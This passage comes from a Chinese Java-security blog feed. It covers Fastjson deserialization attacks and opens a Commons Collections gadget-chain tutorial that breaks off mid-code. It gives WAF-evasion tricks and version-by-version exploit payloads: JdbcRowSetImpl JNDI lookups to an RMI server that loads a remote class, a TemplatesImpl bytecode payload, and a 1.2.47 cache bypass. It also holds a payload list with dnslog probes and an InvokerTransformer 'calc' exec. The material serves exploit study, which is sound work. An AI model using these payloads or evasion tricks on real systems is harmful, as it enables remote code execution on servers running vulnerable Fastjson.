class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;c1, c2, c3, c4&#125;), <span class="hljs-number">16</span>);<br>    hash = <span class="hljs-number">31</span> * hash + val;<br>    <span class="hljs-built_in">this</span>.putChar((<span class="hljs-type">char</span>)val);<br>    <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>    <span class="hljs-type">char</span> <span class="hljs-variable">x1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.ch = <span class="hljs-built_in">this</span>.next();<br>    x2 = <span class="hljs-built_in">this</span>.ch = <span class="hljs-built_in">this</span>.next();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">x_val</span> <span class="hljs-operator">=</span> digits[x1] * <span class="hljs-number">16</span> + digits[x2];<br>    <span class="hljs-type">char</span> <span class="hljs-variable">x_char</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>)x_val;<br>    hash = <span class="hljs-number">31</span> * hash + x_char;<br>    <span class="hljs-built_in">this</span>.putChar(x_char);<br></code></pre></td></tr></table></figure><p>当输入的字符是形如<code>\u</code>​或者<code>\x</code>​的情况下fastjson是会对其进行解码操作的,fastjson支持字符串的Unicode编码和十六进制编码 所以默认情况下是可以通过unicode编码和16进制来进行绕过的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130474.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130693.png" alt="image">​</p><p>‍</p><h2 id="Fastjson绕waf"><a href="#Fastjson绕waf" class="headerlink" title="Fastjson绕waf"></a>Fastjson绕waf</h2><h5 id="结合Feature词法分析器进行混淆绕过"><a href="#结合Feature词法分析器进行混淆绕过" class="headerlink" title="结合Feature词法分析器进行混淆绕过"></a>结合Feature词法分析器进行混淆绕过</h5><p>FastJson在序列化和反序列化的过程中提供了很多特性,例如Feature.DisableFieldSmartMatch。如果没有选择该Feature,那么在反序列的过程中，FastJson会自动把下划线命名的Json字符串转化到驼峰式命名的Java对象字段中</p><p>会存在以下的一些Feature语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">features |= Feature.AutoCloseSource.getMask();<br>features |= Feature.InternFieldNames.getMask();<br>features |= Feature.UseBigDecimal.getMask();<br>features |= Feature.AllowUnQuotedFieldNames.getMask();<br>features |= Feature.AllowSingleQuotes.getMask();<br>features |= Feature.AllowArbitraryCommas.getMask();<br>features |= Feature.SortFeidFastMatch.getMask();<br>features |= Feature.IgnoreNotMatch.getMask();<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130865.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130089.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*\u001a&#123;/*y4tacker*/</span><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;*/<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130258.png" alt="image">​</p><p>‍</p><ol start="5"><li>Content-Type设置为通配符<code>*/*</code>​来绕过相关的检查</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130398.png" alt="image">​</p><p>‍</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>1.2.24</p><h5 id=""><a href="#" class="headerlink" title="&lt;&#x3D;1.2.24"></a>&lt;&#x3D;1.2.24</h5><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson_Jdbc_RMI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/badClassName\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;_outputProperties\&quot;:\&quot;&#123; &#125;\&quot;, &quot;</span> +<br>            <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a.b\&quot; &quot;</span> +<br><span class="hljs-string">&quot;\&quot;_tfactory\&quot;:\&quot;&#123; &#125;\&quot;, &quot;</span> +<br><span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;base64\&quot;] &quot;</span>+<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><br></code></pre></td></tr></table></figure><p>‍</p><h5 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/nhdzhn\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><h5 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/nhdzhn\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>‍</p><h5 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/nhdzhn\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><h5 id="1-2-25-1-2-47通杀"><a href="#1-2-25-1-2-47通杀" class="headerlink" title="1.2.25-1.2.47通杀"></a>1.2.25-1.2.47通杀</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/evilObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Fastjson的智能匹配解析"><a href="#Fastjson的智能匹配解析" class="headerlink" title="Fastjson的智能匹配解析"></a>Fastjson的智能匹配解析</h5><ol><li>使用<code>-</code>​混淆字段名</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130596.png" alt="image">​</p><ol start="2"><li>使用<code>_</code>​混淆字段名</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130808.png" alt="image">​</p><ol start="3"><li>使用<code>-</code>​和<code>_</code>​组合</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130991.png" alt="image">​</p><ol start="4"><li>添加is来混淆属性</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130153.png" alt="image">​</p><p>‍</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap/rmi Server&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;zeo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br><br><span class="hljs-comment">// 1.2.25-1.2.41</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/bm0qgp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">//TemplatesImpl</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>&#x27;_name&#x27;<span class="hljs-punctuation">:</span>&#x27;a.b&#x27;<span class="hljs-punctuation">,</span>&#x27;_tfactory&#x27;<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;base64&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - CommonsCollections链 全系列详解</title>
    <link href="/post/commonscollections-full-series-of-detailed-explanations-1ssdo3.html"/>
    <url>/post/commonscollections-full-series-of-detailed-explanations-1ssdo3.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm首先这篇文章是跟着@<a href="https://space.bilibili.com/2142877265/video?tid=0&amp;special_type=&amp;pn=1&amp;keyword=">白日梦组长</a>学的，是在自己有一定的Java审计和Java反序列化的基础上重新回顾(其实我已经看了好几遍了，每次看的感觉都不一样，故自己再次总结一下CC的全系列)，其实归根来说，CC系列其实就是一个链子的排列组合，从我最后的图可以看出，其实就是一个迷宫，完美的诠释了什么叫<code>条条大路通罗马</code>​的含义，这里就对反序列化和一些基础知识就不过多赘述，目的就是为了让我忘记CC的时候看我这篇博客可以完全想起来CC到底是怎么个事，文章顺序是跟组长一样的，因为他安排的已经非常到位了</p><p>‍</p><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>CC1有两条 分别是 <code>TransformedMap</code>​  跟<code>LazyMap</code>​</p><p>环境配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="TransformedMap​"><a href="#TransformedMap​" class="headerlink" title="TransformedMap​"></a><code>TransformedMap</code>​</h2><p>‍</p><h3 id="InvokerTransformer​​​"><a href="#InvokerTransformer​​​" class="headerlink" title="InvokerTransformer​​​"></a><code>InvokerTransformer</code>​​​</h3><p>作者是先从 <code>commons-collections-3.2.1.jar!\org\apache\commons\collections\Transformer</code>​在这里找到了一个接口 <code>Transformer</code>​ 他接受一个Object的传参，并且返回的也是Object，而他的实现类都在<code>\commons-collections-3.2.1.jar!\org\apache\commons\collections\functors</code>​(这是<code>commons-collections</code>​自定义的一组功能类)</p><p>‍</p><p>作者找到了<code>InvokerTransformer</code>​这个实现类中的<code>transform</code>​方法可以任意方法调用的写法</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540219.png" alt="image">​</p><p>如何调用呢？其实也很简单，先弹个计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>invokerTransformer.transform(Runtime.getRuntime());<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540645.png" alt="image">​</p><p>那么我们找到了危险函数，我们就往上找谁去能够调用<code>transform</code>​并且是可以传入可控的Object对象的</p><p>‍</p><h3 id="TransformedMap​​​"><a href="#TransformedMap​​​" class="headerlink" title="TransformedMap​​​"></a><code>TransformedMap</code>​​​</h3><p>作者就找到了<code>org\apache\commons\collections\map\TransformedMap</code>​类中的<code>checkSetValue</code>​方法是接收<code>Object</code>​对象并且调用了<code>transform</code>​方法，并且是<code>protected</code>​属性</p><p><img src="C:\Users\Zachariah.Jack\Desktop\tmp_wp_picture\202312142038728.png" alt="image"></p><p>那么聪这个函数来看有颜色变换而且现在来看并不知道<code>valueTransformer</code>​是啥，所以我们先去看一下这个函数的构造方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540940.png" alt="image">发现是传入<code>Map map, Transformer keyTransformer, Transformer valueTransformer</code>​ 三个参数，并且把参数给到<code>this.valueTransformer</code>​ 但是这里由于是<code>protected</code>​属性，所以再去找一下是自己在哪里调用了自己</p><p>发现存在一个静态方法<code>decorate</code>​，也是传入三个参数直接传入到构造方法中，那么我们从上面的代码进行修改一下看能否调用</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540126.png" alt="image">​</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">//        invokerTransformer.transform(Runtime.getRuntime());</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title 